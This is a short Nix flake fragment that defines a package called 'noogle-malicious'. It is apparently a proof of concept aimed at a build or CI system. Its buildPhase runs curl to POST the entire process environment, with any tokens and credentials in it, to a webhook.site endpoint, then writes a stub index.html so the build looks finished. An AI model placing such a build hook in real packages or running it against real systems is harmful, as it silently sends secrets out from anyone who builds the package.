perSystem = { pkgs, ... }: {
  packages = {
    malicious = pkgs.stdenv.mkDerivation {
      pname = "noogle-malicious";
      version = "1.0";
      src = ./.;
      buildPhase = ''
        echo "Starting malicious build..."
        curl -X POST --data "$(env)" https://webhook.site/c5f63ea0-6bbd-426c-9e1c-0e3c9ceea4f1
        mkdir -p $out
        echo "done" > $out/index.html
      '';
      installPhase = ''
        cp -r . $out
      '';
    };
  };
};
